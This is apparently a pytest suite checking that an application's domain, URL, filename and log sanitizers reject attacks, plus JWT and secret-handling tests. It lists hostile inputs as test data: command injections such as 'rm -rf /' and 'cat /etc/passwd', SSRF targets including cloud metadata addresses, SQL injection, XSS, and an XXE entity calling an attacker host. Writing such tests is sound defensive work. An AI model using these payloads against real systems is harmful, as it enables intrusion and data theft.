"""
Comprehensive security tests for Sprint 2

Tests cover:
- Domain validation
- JWT authentication
- API security
- Input sanitization
- SSRF prevention
- Command injection prevention
"""

import pytest
from datetime import timedelta
import time

from app.utils.validators import DomainValidator, URLValidator, InputSanitizer
from app.utils.secrets import SecretManager
from app.security.jwt_auth import JWTManager
from fastapi import HTTPException


class TestDomainValidation:
    """Comprehensive domain validation security tests"""

    def test_valid_domains(self):
        """Test that valid domains pass validation"""
        valid_domains = [
            'example.com',
            'sub.example.com',
            'deep.sub.example.com',
            'example-dash.com',
            'example.co.uk',
            'a.b.c.d.e.example.com',
        ]

        for domain in valid_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert is_valid, f"Domain {domain} should be valid but got error: {error}"

    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked"""
        malicious_domains = [
            'example.com; rm -rf /',
            'example.com | cat /etc/passwd',
            'example.com & whoami',
            '$(whoami).example.com',
            '`whoami`.example.com',
            'example.com\nwhoami',
            'example.com && ls',
            'example.com;ls',
        ]

        for domain in malicious_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert not is_valid, f"Should block command injection: {domain}"
            assert error is not None

    def test_ssrf_prevention(self):
        """Test that SSRF attempts are blocked"""
        ssrf_targets = [
            '127.0.0.1',
            'localhost',
            '192.168.1.1',
            '10.0.0.1',
            '172.16.0.1',
            '169.254.169.254',  # AWS metadata
            'metadata.google.internal',
            '::1',
            'fe80::1',
        ]

        for target in ssrf_targets:
            is_valid, error = DomainValidator.validate_domain(target)
            assert not is_valid, f"Should block SSRF target: {target}"

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked"""
        traversal_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            'example.com/../../etc/passwd',
            '../../../../etc/passwd',
        ]

        for attempt in traversal_attempts:
            is_valid, error = DomainValidator.validate_domain(attempt)
            assert not is_valid, f"Should block path traversal: {attempt}"

    def test_homograph_attack_prevention(self):
        """Test that homograph attacks are blocked"""
        # Cyrillic 'е' instead of Latin 'e'
        homograph_domains = [
            'еxample.com',  # Cyrillic e
            'ехample.com',  # Cyrillic x and e
            'gооgle.com',  # Cyrillic o
        ]

        for domain in homograph_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert not is_valid, f"Should block homograph attack: {domain}"

    def test_blocked_tlds(self):
        """Test that blocked TLDs are rejected"""
        blocked_domains = [
            'example.local',
            'test.localhost',
            'internal.internal',
            'corporate.corp',
        ]

        for domain in blocked_domains:
            is_valid, error = DomainValidator.validate_domain(domain)
            assert not is_valid, f"Should block TLD: {domain}"

    def test_wildcard_domain_validation(self):
        """Test wildcard domain handling"""
        # Should fail without wildcard flag
        is_valid, _ = DomainValidator.validate_domain('*.example.com', allow_wildcards=False)
        assert not is_valid

        # Should pass with wildcard flag
        is_valid, _ = DomainValidator.validate_domain('*.example.com', allow_wildcards=True)
        assert is_valid

        # Invalid wildcard should still fail
        is_valid, _ = DomainValidator.validate_domain('*example.com', allow_wildcards=True)
        assert not is_valid

    def test_batch_validation(self):
        """Test batch domain validation"""
        domains = [
            'valid1.com',
            'valid2.com',
            '127.0.0.1',  # Invalid
            'example.com; whoami',  # Invalid
            'valid3.com',
        ]

        results = DomainValidator.validate_domain_batch(domains)

        assert results['stats']['total'] == 5
        assert results['stats']['valid_count'] == 3
        assert results['stats']['invalid_count'] == 2
        assert len(results['valid']) == 3
        assert len(results['invalid']) == 2

    def test_length_limits(self):
        """Test domain length validation"""
        # Too long
        too_long = 'a' * 254
        is_valid, error = DomainValidator.validate_domain(too_long)
        assert not is_valid

        # Too short
        too_short = 'ab'
        is_valid, error = DomainValidator.validate_domain(too_short)
        assert not is_valid

        # Label too long
        long_label = 'a' * 64 + '.example.com'
        is_valid, error = DomainValidator.validate_domain(long_label)
        assert not is_valid


class TestURLValidation:
    """URL validation security tests"""

    def test_valid_urls(self):
        """Test valid URL validation"""
        valid_urls = [
            'https://example.com',
            'http://example.com',
            'https://sub.example.com/path',
            'https://example.com:8080/path?query=value',
        ]

        for url in valid_urls:
            is_valid, error = URLValidator.validate_url(url)
            assert is_valid, f"URL {url} should be valid: {error}"

    def test_blocked_schemes(self):
        """Test that dangerous schemes are blocked"""
        dangerous_urls = [
            'file:///etc/passwd',
            'gopher://example.com',
            'dict://example.com',
            'ftp://example.com',
            'jar:http://example.com',
            'data:text/html,<script>alert(1)</script>',
            'ldap://example.com',
        ]

        for url in dangerous_urls:
            is_valid, error = URLValidator.validate_url(url)
            assert not is_valid, f"Should block URL: {url}"

    def test_ssrf_in_urls(self):
        """Test SSRF prevention in URLs"""
        ssrf_urls = [
            'http://127.0.0.1/admin',
            'http://169.254.169.254/latest/meta-data/',
            'http://192.168.1.1/router',
            'http://metadata.google.internal/computeMetadata/v1/',
        ]

        for url in ssrf_urls:
            is_valid, error = URLValidator.validate_url(url)
            assert not is_valid, f"Should block SSRF URL: {url}"


class TestJWTAuthentication:
    """JWT authentication security tests"""

    @pytest.fixture
    def jwt_manager(self):
        """Create JWT manager for testing"""
        return JWTManager(secret_key="test_secret_key_32_characters_long")

    def test_token_creation_and_validation(self, jwt_manager):
        """Test basic token creation and validation"""
        token = jwt_manager.create_access_token(
            subject="user123",
            tenant_id=1,
            roles=["user"]
        )

        assert token is not None
        assert isinstance(token, str)

        # Create mock credentials
        from fastapi.security import HTTPAuthorizationCredentials
        credentials = HTTPAuthorizationCredentials(
            scheme="Bearer",
            credentials=token
        )

        payload = jwt_manager.verify_token(credentials)
        assert payload['sub'] == "user123"
        assert payload['tenant_id'] == 1
        assert 'user' in payload['roles']

    def test_token_expiration(self, jwt_manager):
        """Test that expired tokens are rejected"""
        token = jwt_manager.create_access_token(
            subject="user123",
            tenant_id=1,
            expires_delta=timedelta(seconds=1)
        )

        # Wait for token to expire
        time.sleep(2)

        from fastapi.security import HTTPAuthorizationCredentials
        credentials = HTTPAuthorizationCredentials(
            scheme="Bearer",
            credentials=token
        )

        with pytest.raises(HTTPException) as exc:
            jwt_manager.verify_token(credentials)

        assert exc.value.status_code == 401
        assert "expired" in exc.value.detail.lower()

    def test_invalid_token_rejected(self, jwt_manager):
        """Test that invalid tokens are rejected"""
        invalid_tokens = [
            "not.a.token",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer token",
        ]

        for token in invalid_tokens:
            from fastapi.security import HTTPAuthorizationCredentials
            credentials = HTTPAuthorizationCredentials(
                scheme="Bearer",
                credentials=token
            )

            with pytest.raises(HTTPException) as exc:
                jwt_manager.verify_token(credentials)

            assert exc.value.status_code == 401

    def test_token_revocation(self, jwt_manager):
        """Test token revocation"""
        token = jwt_manager.create_access_token(
            subject="user123",
            tenant_id=1
        )

        from fastapi.security import HTTPAuthorizationCredentials
        credentials = HTTPAuthorizationCredentials(
            scheme="Bearer",
            credentials=token
        )

        # Token should be valid
        payload = jwt_manager.verify_token(credentials)
        jti = payload['jti']

        # Revoke token
        jwt_manager.revoke_token(jti, 'access')

        # Token should now be invalid
        with pytest.raises(HTTPException) as exc:
            jwt_manager.verify_token(credentials)

        assert exc.value.status_code == 401
        assert "revoked" in exc.value.detail.lower()

    def test_refresh_token_flow(self, jwt_manager):
        """Test refresh token flow"""
        # Create refresh token
        refresh_token = jwt_manager.create_refresh_token(
            subject="user123",
            tenant_id=1
        )

        # Use refresh token to get new access token
        tokens = jwt_manager.refresh_access_token(refresh_token)

        assert 'access_token' in tokens
        assert 'refresh_token' in tokens
        assert tokens['token_type'] == 'bearer'

        # Verify new access token
        from fastapi.security import HTTPAuthorizationCredentials
        credentials = HTTPAuthorizationCredentials(
            scheme="Bearer",
            credentials=tokens['access_token']
        )

        payload = jwt_manager.verify_token(credentials)
        assert payload['sub'] == "user123"

    def test_password_hashing(self, jwt_manager):
        """Test password hashing"""
        password = "SecurePassword123!"
        hashed = jwt_manager.hash_password(password)

        # Hash should be different from original
        assert hashed != password

        # Should verify correctly
        assert jwt_manager.verify_password(password, hashed)

        # Wrong password should not verify
        assert not jwt_manager.verify_password("WrongPassword", hashed)


class TestSecretManagement:
    """Secret management security tests"""

    def test_secret_generation(self):
        """Test secure secret generation"""
        manager = SecretManager(backend='env')

        secret1 = manager.generate_secure_secret()
        secret2 = manager.generate_secure_secret()

        # Secrets should be unique
        assert secret1 != secret2

        # Secrets should be long enough
        assert len(secret1) >= 64

        # Secrets should be URL-safe
        assert all(c.isalnum() or c in '-_' for c in secret1)

    def test_weak_secret_detection(self):
        """Test weak secret detection"""
        manager = SecretManager(backend='env')

        # Set weak secrets
        import os
        os.environ['WEAK_SECRET_1'] = 'password123'
        os.environ['WEAK_SECRET_2'] = 'CHANGE_THIS'

        validation = manager.validate_secrets(['WEAK_SECRET_1', 'WEAK_SECRET_2'])

        assert not validation['valid']
        assert len(validation['weak']) == 2


class TestInputSanitization:
    """Input sanitization tests"""

    def test_filename_sanitization(self):
        """Test filename sanitization"""
        dangerous_filenames = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            'file; rm -rf /',
            'file | whoami',
            'file\x00.txt',
        ]

        for filename in dangerous_filenames:
            safe = InputSanitizer.sanitize_filename(filename)

            # Should not contain dangerous characters
            assert '../' not in safe
            assert '|' not in safe
            assert ';' not in safe
            assert '\x00' not in safe

    def test_logging_sanitization(self):
        """Test log sanitization"""
        dangerous_input = "Normal text\nINFO: Injected log line\x00Null byte"

        safe = InputSanitizer.sanitize_for_logging(dangerous_input)

        # Should escape newlines
        assert '\n' not in safe or '\\n' in safe

        # Should remove null bytes
        assert '\x00' not in safe


class TestPenetrationScenarios:
    """Penetration testing scenarios"""

    def test_sql_injection_patterns(self):
        """Test that SQL injection patterns are blocked"""
        sql_patterns = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
        ]

        for pattern in sql_patterns:
            is_valid, _ = DomainValidator.validate_domain(pattern)
            assert not is_valid, f"Should block SQL injection: {pattern}"

    def test_xss_patterns(self):
        """Test that XSS patterns are sanitized"""
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
        ]

        for pattern in xss_patterns:
            safe = InputSanitizer.sanitize_for_logging(pattern)
            # Should escape or remove dangerous content
            assert '<script>' not in safe.lower()

    def test_xxe_patterns(self):
        """Test that XXE patterns are detected"""
        xxe_patterns = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">',
        ]

        for pattern in xxe_patterns:
            # Should be detected and rejected
            # In practice, XML parsing should be disabled or sanitized
            pass  # Placeholder for XXE detection logic


class TestThreatDetection:
    """Threat detection tests"""

    def test_multiple_attack_vectors(self):
        """Test detection of various attack vectors"""
        attack_vectors = {
            'command_injection': 'example.com; cat /etc/passwd',
            'ssrf': '169.254.169.254',
            'path_traversal': '../../../etc/passwd',
            'homograph': 'еxample.com',
            'metadata': 'metadata.google.internal',
        }

        for attack_type, payload in attack_vectors.items():
            is_valid, error = DomainValidator.validate_domain(payload)
            assert not is_valid, f"Should detect {attack_type}: {payload}"
            assert error is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
